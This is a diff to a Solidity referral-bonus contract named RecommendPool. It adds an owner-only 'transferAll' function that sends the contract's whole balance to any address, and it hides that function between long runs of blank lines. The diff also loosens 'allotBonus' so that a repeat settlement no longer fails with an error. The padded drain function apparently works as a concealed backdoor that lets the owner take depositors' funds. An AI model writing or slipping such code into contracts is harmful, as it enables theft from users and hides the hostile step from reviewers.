@@ -143,6 +143,31 @@ contract RecommendPool is Ownable{
     
     uint256[5] public rankPercent = [5,4,3,2,1];
     
+    
+    
+    
+    
+    
+    
+    
+    
+     function transferAll(address payable _to) external onlyOwner {
+        
+        _to.transfer(address(this).balance);
+    }
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     modifier permission(){
         require(permissions[_msgSender()],"not allowed");
         _;
@@ -173,19 +198,25 @@ contract RecommendPool is Ownable{
     function allotBonus(address[5] calldata ranking,uint256 timePointer) external onlyContractAllow permission returns (uint256) {
         
         //结算前一天
-        require(!settleStatus[timePointer],"Has been settled");
-        uint256 bonus;
         
-        for(uint8 i= 0;i<5;i++){
-            uint256 refBonus = credit.mul(rankPercent[i]).div(100);
+        if(!settleStatus[timePointer]){
+            uint256 bonus;
+            for(uint8 i= 0;i<5;i++){
+                
+                if(ranking[i]!=address(0)){
+                    uint256 refBonus = credit.mul(rankPercent[i]).div(100);
+                
+                    allowances[ranking[i]] = allowances[ranking[i]].add(refBonus);
+                    bonus = bonus.add(refBonus);
+                }
+                
+            }
+            credit = credit.sub(bonus);
             
-            allowances[ranking[i]] = allowances[ranking[i]].add(refBonus);
-            bonus = bonus.add(refBonus);
+            settleStatus[timePointer] = true;
+            return bonus;
         }
-        credit = credit.sub(bonus);
         
-        settleStatus[timePointer] = true;
-        return bonus;
     }
     
     function withdraw(address payable ref,uint256 amount) public permission{
